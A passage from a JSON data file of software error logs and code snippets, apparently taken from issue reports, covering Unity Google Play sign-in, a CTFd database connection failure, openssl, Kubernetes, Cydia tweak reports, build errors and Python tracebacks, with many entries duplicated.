        "logs": "using GooglePlayGames;\r\nusing GooglePlayGames.BasicApi;\r\nusing UnityEngine;\r\n\r\n       /// <summary>\r\n        /// Authorization with Google Play Services;\r\n        /// </summary>\r\n        private void LoginWithGooglePlayServices()\r\n        {\r\n            PlayGamesClientConfiguration config = new PlayGamesClientConfiguration.Builder()\r\n                // requests a server auth code be generated so it can be passed to an\r\n                //  associated back end server application and exchanged for an OAuth token.\r\n                .RequestServerAuthCode(false)\r\n                .Build();\r\n            PlayGamesPlatform.DebugLogEnabled = true;\r\n            PlayGamesPlatform.InitializeInstance(config);\r\n            PlayGamesPlatform.Activate();\r\n\r\n            PlayGamesPlatform.Instance.Authenticate(GplaySignInCallback, false);\r\n            \r\n        }\r\n\r\n        /// <summary>\r\n        /// UI Google Play Services handler;\r\n        /// </summary>\r\n        /// <param name=\"success\"></param>\r\n        private void GplaySignInCallback(bool success)\r\n        {\r\n            Debug.Log(\"!!!!!!!!!!!!!!!!!!!!!!!!! GplaySignInCallback PlayGamesPlatform.Instance.GetServerAuthCode()=\" \r\n                      + PlayGamesPlatform.Instance.GetServerAuthCode());\r\n            Debug.Log(\"!!!!!!!!!!!!!!!!!!!!!!!!! PlayGamesPlatform.Instance.localUser.authenticated = \"\r\n                      + PlayGamesPlatform.Instance.localUser.authenticated.ToString());\r\n            \r\n            if (success)\r\n            {\r\n                SignInSuccessHandler(PlatformTypes.GOOGLE_ACCOUNT, PlayGamesPlatform.Instance.localUser.id,\r\n                    PlayGamesPlatform.Instance.GetServerAuthCode());\r\n            }\r\n            else\r\n            {\r\n                SignInSuccessHandler(PlatformTypes.ANDROID_ADVERT, _advId, string.Empty);\r\n            }\r\n        }"
    },
    {
        "logs": "OperationalError: (pymysql.err.OperationalError) (1045, u\"Access denied for user 'root'@'localhost' (using password: NO)\") (Background on this error at: http://sqlalche.me/e/e3q8)"
    },
    {
        "logs": "[root@localhost CTFd]# gunicorn --bind 0.0.0.0:8009 -w 1 \"CTFd:create_app()\"\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Starting gunicorn 19.7.1\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Listening at: http://0.0.0.0:8009 (3562)\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Using worker: sync\r\n[2018-06-22 14:19:06 +0000] [3567] [INFO] Booting worker with pid: 3567\r\n[2018-06-22 14:19:06 +0000] [3567] [ERROR] Exception in worker process\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/arbiter.py\", line 578, in spawn_worker\r\n    worker.init_process()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/workers/base.py\", line 126, in init_process\r\n    self.load_wsgi()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/workers/base.py\", line 135, in load_wsgi\r\n    self.wsgi = self.app.wsgi()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/base.py\", line 67, in wsgi\r\n    self.callable = self.load()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py\", line 65, in load\r\n    return self.load_wsgiapp()\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py\", line 52, in load_wsgiapp\r\n    return util.import_app(self.app_uri)\r\n  File \"/usr/lib/python2.7/site-packages/gunicorn/util.py\", line 364, in import_app\r\n    app = eval(obj, vars(mod))\r\n  File \"<string>\", line 1, in <module>\r\n  File \"/root/CTFd/CTFd/__init__.py\", line 103, in create_app\r\n    if not database_exists(url):\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy_utils/functions/database.py\", line 477, in database_exists\r\n    return bool(get_scalar_result(engine, text))\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy_utils/functions/database.py\", line 455, in get_scalar_result\r\n    result_proxy = engine.execute(sql)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2074, in execute\r\n    connection = self.contextual_connect(close_with_result=True)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2123, in contextual_connect\r\n    self._wrap_pool_connect(self.pool.connect, None),\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2162, in _wrap_pool_connect\r\n    e, dialect, self)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 1476, in _handle_dbapi_exception_noconnection\r\n    exc_info\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/util/compat.py\", line 203, in raise_from_cause\r\n    reraise(type(exception), exception, tb=exc_tb, cause=cause)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/base.py\", line 2158, in _wrap_pool_connect\r\n    return fn()\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 403, in connect\r\n    return _ConnectionFairy._checkout(self)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 782, in _checkout\r\n    fairy = _ConnectionRecord.checkout(pool)\r\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/pool.py\", line 532, in checkout\r\n[Truncated]\n  File \"/usr/lib/python2.7/site-packages/sqlalchemy/engine/default.py\", line 410, in connect\r\n    return self.dbapi.connect(*cargs, **cparams)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/__init__.py\", line 90, in Connect\r\n    return Connection(*args, **kwargs)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 699, in __init__\r\n    self.connect()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 936, in connect\r\n    self._request_authentication()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 1156, in _request_authentication\r\n    auth_packet = self._read_packet()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 1018, in _read_packet\r\n    packet.check_error()\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/connections.py\", line 384, in check_error\r\n    err.raise_mysql_exception(self._data)\r\n  File \"/usr/lib/python2.7/site-packages/pymysql/err.py\", line 107, in raise_mysql_exception\r\n    raise errorclass(errno, errval)\r\nOperationalError: (pymysql.err.OperationalError) (1045, u\"Access denied for user 'root'@'localhost' (using password: NO)\") (Background on this error at: http://sqlalche.me/e/e3q8)\r\n[2018-06-22 14:19:06 +0000] [3567] [INFO] Worker exiting (pid: 3567)\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Shutting down: Master\r\n[2018-06-22 14:19:06 +0000] [3562] [INFO] Reason: Worker failed to boot."
    },
    {
        "logs": "openssl s_server -www -cert data_files/server5.crt -key data_files/server5.key -accept 17183 -dhparam data_files/dhparams.pem -key data_files/server2.key              -cert data_files/server2.ku-ds.crt\r\nError with command: \"-dhparam data_files/dhparams.pem\""
    },
    {
        "logs": "Tolerations:     CriticalAddonsOnly\r\n                 dedicated:NoSchedule\r\n                 node.kubernetes.io/memory-pressure:NoSchedule\r\n                 node.kubernetes.io/not-ready:NoExecute for 300s\r\n                 node.kubernetes.io/unreachable:NoExecute for 300s"
    },
    {
        "logs": "Tolerations:     CriticalAddonsOnly\r\n                 dedicated:NoSchedule\r\n                 node.kubernetes.io/memory-pressure:NoSchedule\r\n                 node.kubernetes.io/not-ready:NoExecute for 300s\r\n                 node.kubernetes.io/unreachable:NoExecute for 300s"
    },
    {
        "logs": "{\r\n  \"packageId\": \"ws.hbang.newterm2\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"ws.hbang.newterm2\",\r\n    \"deviceId\": \"iPhone8,2\",\r\n    \"url\": \"http://cydia.saurik.com/package/ws.hbang.newterm2/\",\r\n    \"iOSVersion\": \"12.4\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"category\": \"Terminal Support\",\r\n    \"repository\": \"Chariz\",\r\n    \"name\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"installed\": \"2.3\",\r\n    \"packageIndexed\": true,\r\n    \"packageStatusExplaination\": \"A matching version of this tweak for this iOS version could not be found. Please submit a review if you choose to install.\",\r\n    \"id\": \"ws.hbang.newterm2\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"A powerful terminal app for iOS\",\r\n    \"latest\": \"2.3\",\r\n    \"author\": \"HASHBANG Productions\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJ3cy5oYmFuZy5uZXd0ZXJtMiIsImRldmljZUlkIjoiaVBob25lOCwyIiwidXJsIjoiaHR0cDpcL1wvY3lkaWEuc2F1cmlrLmNvbVwvcGFja2FnZVwvd3MuaGJhbmcubmV3dGVybTJcLyIsImlPU1ZlcnNpb24iOiIxMi40IiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJOZXdUZXJtIChpT1MgMTAg4oCTIDEzKSIsImNhdGVnb3J5IjoiVGVybWluYWwgU3VwcG9ydCIsInJlcG9zaXRvcnkiOiJDaGFyaXoiLCJuYW1lIjoiTmV3VGVybSAoaU9TIDEwIOKAkyAxMykiLCJpbnN0YWxsZWQiOiIyLjIuMSIsInBhY2thZ2VJbmRleGVkIjp0cnVlLCJwYWNrYWdlU3RhdHVzRXhwbGFpbmF0aW9uIjoiQSBtYXRjaGluZyB2ZXJzaW9uIG9mIHRoaXMgdHdlYWsgZm9yIHRoaXMgaU9TIHZlcnNpb24gY291bGQgbm90IGJlIGZvdW5kLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6IndzLmhiYW5nLm5ld3Rlcm0yIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkEgcG93ZXJmdWwgdGVybWluYWwgYXBwIGZvciBpT1MiLCJsYXRlc3QiOiIyLjMiLCJhdXRob3IiOiJIQVNIQkFORyBQcm9kdWN0aW9ucyIsInBhY2thZ2VTdGF0dXMiOiJVbmtub3duIn0=\",\r\n  \"chosenStatus\": \"not working\",\r\n  \"notes\": \"Crashes upon entering\"\r\n}"
    },
    {
        "logs": "{\r\n  \"packageId\": \"ws.hbang.newterm2\",\r\n  \"action\": \"notworking\",\r\n  \"userInfo\": {\r\n    \"arch32\": false,\r\n    \"packageId\": \"ws.hbang.newterm2\",\r\n    \"deviceId\": \"iPhone8,2\",\r\n    \"url\": \"http://cydia.saurik.com/package/ws.hbang.newterm2/\",\r\n    \"iOSVersion\": \"12.4\",\r\n    \"packageVersionIndexed\": false,\r\n    \"packageName\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"category\": \"Terminal Support\",\r\n    \"repository\": \"Chariz\",\r\n    \"name\": \"NewTerm (iOS 10 \u00e2\u0080\u0093 13)\",\r\n    \"installed\": \"2.3\",\r\n    \"packageIndexed\": true,\r\n    \"packageStatusExplaination\": \"A matching version of this tweak for this iOS version could not be found. Please submit a review if you choose to install.\",\r\n    \"id\": \"ws.hbang.newterm2\",\r\n    \"commercial\": false,\r\n    \"packageInstalled\": true,\r\n    \"tweakCompatVersion\": \"0.1.5\",\r\n    \"shortDescription\": \"A powerful terminal app for iOS\",\r\n    \"latest\": \"2.3\",\r\n    \"author\": \"HASHBANG Productions\",\r\n    \"packageStatus\": \"Unknown\"\r\n  },\r\n  \"base64\": \"eyJhcmNoMzIiOmZhbHNlLCJwYWNrYWdlSWQiOiJ3cy5oYmFuZy5uZXd0ZXJtMiIsImRldmljZUlkIjoiaVBob25lOCwyIiwidXJsIjoiaHR0cDpcL1wvY3lkaWEuc2F1cmlrLmNvbVwvcGFja2FnZVwvd3MuaGJhbmcubmV3dGVybTJcLyIsImlPU1ZlcnNpb24iOiIxMi40IiwicGFja2FnZVZlcnNpb25JbmRleGVkIjpmYWxzZSwicGFja2FnZU5hbWUiOiJOZXdUZXJtIChpT1MgMTAg4oCTIDEzKSIsImNhdGVnb3J5IjoiVGVybWluYWwgU3VwcG9ydCIsInJlcG9zaXRvcnkiOiJDaGFyaXoiLCJuYW1lIjoiTmV3VGVybSAoaU9TIDEwIOKAkyAxMykiLCJpbnN0YWxsZWQiOiIyLjIuMSIsInBhY2thZ2VJbmRleGVkIjp0cnVlLCJwYWNrYWdlU3RhdHVzRXhwbGFpbmF0aW9uIjoiQSBtYXRjaGluZyB2ZXJzaW9uIG9mIHRoaXMgdHdlYWsgZm9yIHRoaXMgaU9TIHZlcnNpb24gY291bGQgbm90IGJlIGZvdW5kLiBQbGVhc2Ugc3VibWl0IGEgcmV2aWV3IGlmIHlvdSBjaG9vc2UgdG8gaW5zdGFsbC4iLCJpZCI6IndzLmhiYW5nLm5ld3Rlcm0yIiwiY29tbWVyY2lhbCI6ZmFsc2UsInBhY2thZ2VJbnN0YWxsZWQiOnRydWUsInR3ZWFrQ29tcGF0VmVyc2lvbiI6IjAuMS41Iiwic2hvcnREZXNjcmlwdGlvbiI6IkEgcG93ZXJmdWwgdGVybWluYWwgYXBwIGZvciBpT1MiLCJsYXRlc3QiOiIyLjMiLCJhdXRob3IiOiJIQVNIQkFORyBQcm9kdWN0aW9ucyIsInBhY2thZ2VTdGF0dXMiOiJVbmtub3duIn0=\",\r\n  \"chosenStatus\": \"not working\",\r\n  \"notes\": \"Crashes upon entering\"\r\n}"
    },
    {
        "logs": " it does not work!\r\n\r\nAfter giving a look at the code (see also the exchange we had with @username_1 here https://github.com/spack/spack/commit/1b18ec90abadf6e476a5e5fe1c82d18849c1d18d#r36027867), the reason behind this different behavior is that:\r\n\r\nWhile on "
    },
    {
        "logs": "File \"/Home-Assistant-custom-components-Xiaomi-Cloud-Map-Extractor/custom_components/xiaomi_cloud_map_extractor/image_handler.py\", line 194, in draw_texts\r\n    text_config[CONF_FONT], text_config[CONF_FONT_SIZE])\r\nKeyError: 'font'"
    },
    {
        "logs": "File \"/Home-Assistant-custom-components-Xiaomi-Cloud-Map-Extractor/custom_components/xiaomi_cloud_map_extractor/image_handler.py\", line 194, in draw_texts\r\n    text_config[CONF_FONT], text_config[CONF_FONT_SIZE])\r\nKeyError: 'font'"
    },
    {
        "logs": "Unable to open 'HelloWorld.cpp': Unable to read file 'c:\\home\\git\\HelloWorld.cpp' (Error: Unable to resolve non-existing file 'c:\\home\\git\\HelloWorld.cpp')."
    },
    {
        "logs": "Unable to open 'HelloWorld.cpp': Unable to read file 'c:\\home\\git\\HelloWorld.cpp' (Error: Unable to resolve non-existing file 'c:\\home\\git\\HelloWorld.cpp')."
    },
    {
        "logs": "-> (C) {\"command\":\"setBreakpoints\",\"arguments\":{\"source\":{\"name\":\"helloworld.cpp\",\"path\":\"vscode-remote://ssh-remote%2Blocalhost/home/git/mod/models/QUnitTest/helloworld.cpp\"},\"lines\":[4],\"breakpoints\":[{\"line\":4}],\"sourceModified\":false},\"type\":\"request\",\"seq\":3}\r\n...\r\n<- (E) {\"seq\":35,\"type\":\"event\",\"event\":\"breakpoint\",\"body\":{\"reason\":\"changed\",\"breakpoint\":{\"id\":1,\"verified\":true,\"source\":{\"name\":\"helloworld.cpp\",\"path\":\"C:\\\\home\\\\git\\\\helloworld.cpp\",\"sourceReference\":0,\"sources\":[],\"checksums\":[{\"algorithm\":\"MD5\",\"checksum\":\"271825a10a704a367d79c180ea2c2531\"}]},\"line\":4,\"endLine\":4}}}"
    },
    {
        "logs": "asciidoctor: WARNING: image to embed not found or not readable: \\\r\n/path/to/src/main/asciidoc/images/diag-0eecdb8aae25da40f6cf41c33fce8cb1.png"
    },
    {
        "logs": "asciidoctor: WARNING: image to embed not found or not readable: \\\r\n/path/to/src/main/asciidoc/images/diag-0eecdb8aae25da40f6cf41c33fce8cb1.png"
    },
    {
        "logs": "\u276f ccm create dse476 --dse --dse-username= --dse-password= -n 1 -v 4.7.6\r\n# fails due to #443\r\n\u276f ccm add node1 --dse -i 127.0.0.1 -j 7199 -t 127.0.0.1 -l 127.0.0.1 --binary-itf 127.0.0.1 --remote-debug-port 0 -n 0\r\n\u276f ccm status\r\nTraceback (most recent call last):\r\n  File \"/usr/local/bin/ccm\", line 72, in <module>\r\n    cmd.validate(parser, options, args)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/cluster_cmds.py\", line 385, in validate\r\n    Cmd.validate(self, parser, options, args, load_cluster=True)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 68, in validate\r\n    self.cluster = self._load_current_cluster()\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 97, in _load_current_cluster\r\n    return ClusterFactory.load(self.path, name)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cluster_factory.py\", line 48, in load\r\n    cluster.nodes[node_name] = Node.load(cluster_path, node_name, cluster)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/node.py\", line 135, in load\r\n    node = cluster.create_node(data['name'], data['auto_bootstrap'], tuple(itf['thrift']), tuple(itf['storage']), data['jmx_port'], remote_debug_port, initial_token, save=False, binary_interface=binary_interface, byteman_port=data['byteman_port'])\r\nTypeError: create_node() got multiple values for keyword argument 'byteman_port'"
    },
    {
        "logs": "\u276f ccm create dse476 --dse --dse-username= --dse-password= -n 1 -v 4.7.6\r\n# fails due to #443\r\n\u276f ccm add node1 --dse -i 127.0.0.1 -j 7199 -t 127.0.0.1 -l 127.0.0.1 --binary-itf 127.0.0.1 --remote-debug-port 0 -n 0\r\n\u276f ccm status\r\nTraceback (most recent call last):\r\n  File \"/usr/local/bin/ccm\", line 72, in <module>\r\n    cmd.validate(parser, options, args)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/cluster_cmds.py\", line 385, in validate\r\n    Cmd.validate(self, parser, options, args, load_cluster=True)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 68, in validate\r\n    self.cluster = self._load_current_cluster()\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cmds/command.py\", line 97, in _load_current_cluster\r\n    return ClusterFactory.load(self.path, name)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/cluster_factory.py\", line 48, in load\r\n    cluster.nodes[node_name] = Node.load(cluster_path, node_name, cluster)\r\n  File \"/usr/local/lib/python2.7/site-packages/ccmlib/node.py\", line 135, in load\r\n    node = cluster.create_node(data['name'], data['auto_bootstrap'], tuple(itf['thrift']), tuple(itf['storage']), data['jmx_port'], remote_debug_port, initial_token, save=False, binary_interface=binary_interface, byteman_port=data['byteman_port'])\r\nTypeError: create_node() got multiple values for keyword argument 'byteman_port'"
    },
    {
        "logs": "../src/binding.cpp:335:42:   instantiated from here\r\n../../nan/nan.h:1865:33: error: 'GetFunction' was not declared in this scope\r\nmake: *** [Release/obj.target/binding/src/binding.o] Error 1\r\nmake: Leaving directory "
    },
    {
        "logs": "DEBUG http://seleniumwire/requests 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/requests 200\r\nDEBUG http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\n----------------------------------------\r\nException happened during processing of request from ('127.0.0.1', 36218)\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 625, in process_request_thread\r\n    self.finish_request(request, client_address)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 354, in finish_request\r\n    self.RequestHandlerClass(request, client_address, self)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 65, in __init__\r\n    super().__init__(*args, **kwargs)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 681, in __init__\r\n    self.handle()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 422, in handle\r\n    self.handle_one_request()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 410, in handle_one_request\r\n    method()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 125, in do_GET\r\n    super().do_GET()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 147, in do_GET\r\n    self.admin_handler()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 36, in admin_handler\r\n    self._get_response_body(**params)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 72, in _get_response_body\r\n    self._send_body(body)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 77, in _send_body\r\n    self._send_response(body, 'application/octet-stream')\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 115, in _send_response\r\n    self.wfile.write(body)\r\n  File \"/usr/lib/python3.5/socket.py\", line 593, in write\r\n    return self._sock.send(b)\r\nTypeError: a bytes-like object is required, not 'str'"
    },
    {
        "logs": "DEBUG http://seleniumwire/requests 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/requests 200\r\nDEBUG http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\nDEBUG:seleniumwire.proxy.handler:http://seleniumwire/response_body?request_id=6f7ba003-9c3c-4b58-a837-73c853488590 200\r\n----------------------------------------\r\nException happened during processing of request from ('127.0.0.1', 36218)\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 625, in process_request_thread\r\n    self.finish_request(request, client_address)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 354, in finish_request\r\n    self.RequestHandlerClass(request, client_address, self)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 65, in __init__\r\n    super().__init__(*args, **kwargs)\r\n  File \"/usr/lib/python3.5/socketserver.py\", line 681, in __init__\r\n    self.handle()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 422, in handle\r\n    self.handle_one_request()\r\n  File \"/usr/lib/python3.5/http/server.py\", line 410, in handle_one_request\r\n    method()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 125, in do_GET\r\n    super().do_GET()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/proxy2.py\", line 147, in do_GET\r\n    self.admin_handler()\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 36, in admin_handler\r\n    self._get_response_body(**params)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 72, in _get_response_body\r\n    self._send_body(body)\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 77, in _send_body\r\n    self._send_response(body, 'application/octet-stream')\r\n  File \"/home/user/.virtualenvs/project/lib/python3.5/site-packages/seleniumwire/proxy/handler.py\", line 115, in _send_response\r\n    self.wfile.write(body)\r\n  File \"/usr/lib/python3.5/socket.py\", line 593, in write\r\n    return self._sock.send(b)\r\nTypeError: a bytes-like object is required, not 'str'"
    },
    {
        "logs": "[ 94%] Building CXX object baxter_simulator/baxter_sim_io/CMakeFiles/baxter_sim_io.dir/qrc_sim_io.cxx.o\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp: In member function \u2018bool arm_kinematics::Kinematics::readJoints(urdf::Model&)\u2019:\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:248:65: error: conversion from \u2018urdf::LinkConstSharedPtr {aka std::shared_ptr<const urdf::Link>}\u2019 to non-scalar type \u2018boost::shared_ptr<const urdf::Link>\u2019 requested\r\n   boost::shared_ptr<const urdf::Link> link = robot_model.getLink(tip_name);\r\n                                              ~~~~~~~~~~~~~~~~~~~^~~~~~~~~~\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:255:60: error: no match for \u2018operator=\u2019 (operand types are \u2018boost::shared_ptr<const urdf::Joint>\u2019 and \u2018urdf::JointConstSharedPtr {aka std::shared_ptr<const urdf::Joint>}\u2019)\r\n       joint = robot_model.getJoint(link->parent_joint->name);\r\n                                                            ^\r\nIn file included from /usr/include/boost/shared_ptr.hpp:17:0,\r\n                 from /opt/ros/melodic/include/ros/forwards.h:37,\r\n                 from /opt/ros/melodic/include/ros/common.h:37,\r\n                 from /opt/ros/melodic/include/ros/ros.h:43,\r\n                 from /home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:35:\r\n/usr/include/boost/smart_ptr/shared_ptr.hpp:547:18: note: candidate: boost::shared_ptr<T>& boost::shared_ptr<T>::operator=(const boost::shared_ptr<T>&) [with T = const urdf::Joint]\r\n     shared_ptr & operator=( shared_ptr const & r ) BOOST_SP_NOEXCEPT\r\n                  ^~~~~~~~"
    },
    {
        "logs": "[ 94%] Building CXX object baxter_simulator/baxter_sim_io/CMakeFiles/baxter_sim_io.dir/qrc_sim_io.cxx.o\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp: In member function \u2018bool arm_kinematics::Kinematics::readJoints(urdf::Model&)\u2019:\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:248:65: error: conversion from \u2018urdf::LinkConstSharedPtr {aka std::shared_ptr<const urdf::Link>}\u2019 to non-scalar type \u2018boost::shared_ptr<const urdf::Link>\u2019 requested\r\n   boost::shared_ptr<const urdf::Link> link = robot_model.getLink(tip_name);\r\n                                              ~~~~~~~~~~~~~~~~~~~^~~~~~~~~~\r\n/home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:255:60: error: no match for \u2018operator=\u2019 (operand types are \u2018boost::shared_ptr<const urdf::Joint>\u2019 and \u2018urdf::JointConstSharedPtr {aka std::shared_ptr<const urdf::Joint>}\u2019)\r\n       joint = robot_model.getJoint(link->parent_joint->name);\r\n                                                            ^\r\nIn file included from /usr/include/boost/shared_ptr.hpp:17:0,\r\n                 from /opt/ros/melodic/include/ros/forwards.h:37,\r\n                 from /opt/ros/melodic/include/ros/common.h:37,\r\n                 from /opt/ros/melodic/include/ros/ros.h:43,\r\n                 from /home/ssnover/catkin_ws/src/baxter_simulator/baxter_sim_kinematics/src/arm_kinematics.cpp:35:\r\n/usr/include/boost/smart_ptr/shared_ptr.hpp:547:18: note: candidate: boost::shared_ptr<T>& boost::shared_ptr<T>::operator=(const boost::shared_ptr<T>&) [with T = const urdf::Joint]\r\n     shared_ptr & operator=( shared_ptr const & r ) BOOST_SP_NOEXCEPT\r\n                  ^~~~~~~~"
    },
    {
        "logs": "11-02 04:31:27.330 31645 31645 D AllegroActivity: onPause\r\n11-02 04:31:27.341 31645 31645 D AllegroActivity: onPause end\r\n11-02 04:31:27.341 31645 31664 D Animatch: [HandleEvent] ALLEGRO_EVENT_DISPLAY_SWITCH_OUT\r\n11-02 04:31:27.483 31645 31664 D Animatch: [PauseExecution] Engine halted.\r\n11-02 04:31:27.483 31645 31664 D Animatch: [MainloopEvents] al_wait_for_event\r\n11-02 04:31:27.527 31645 31645 D AllegroActivity: onSaveInstanceState\r\n11-02 04:31:27.528 31645 31645 D AllegroActivity: onStop.\r\n11-02 04:31:27.665 31645 31645 D AllegroSurface: surfaceDestroyed\r\n11-02 04:31:27.665 31645 31664 D Animatch: [HandleEvent] ALLEGRO_EVENT_DISPLAY_HALT_DRAWING\r\n11-02 04:31:27.666 31645 31664 D AllegroEGL: egl_clearCurrent\r\n11-02 04:31:27.667 31645 31664 D AllegroEGL: egl_clearCurrent done\r\n11-02 04:31:28.667 31645 31664 D Animatch: [MainloopEvents] al_wait_for_event\r\n\r\n11-02 04:31:37.524  2369  2398 W ActivityManager: Activity stop timeout for ActivityRecord{e97a94e u0 com.holypangolin.Animatch/net.dosowisko.libsuperderpy.Activity t3172}\r\n11-02 04:31:37.525  2369  2398 I ActivityManager: Activity reported stop, but no longer stopping: ActivityRecord{e97a94e u0 com.holypangolin.Animatch/net.dosowisko.libsuperderpy.Activity t3172}"
    },
    {
        "logs": "  if (typeof text !== 'string' || !text.match(/^[a-zA-Z\\-0-9]+$/)) {\r\n    console.error(colors.red + `You did not pass in a valid hostname`)\r\n    process.exit(1)\r\n  }"
    },
    {
        "logs": "\turl := \"https://api.ipify.org?format=text\"\r\n\tresp, err := http.Get(url)\r\n\tdefer resp.Body.Close()\r\n\tip, err := ioutil.ReadAll(resp.Body)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tfmt.Printf(\"My IP is:%s\\n\", ip)"
    },
    {
        "logs": "\turl := \"https://api.ipify.org?format=text\"\r\n\tresp, err := http.Get(url)\r\n\tdefer resp.Body.Close()\r\n\tip, err := ioutil.ReadAll(resp.Body)\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tfmt.Printf(\"My IP is:%s\\n\", ip)"
    },
    {
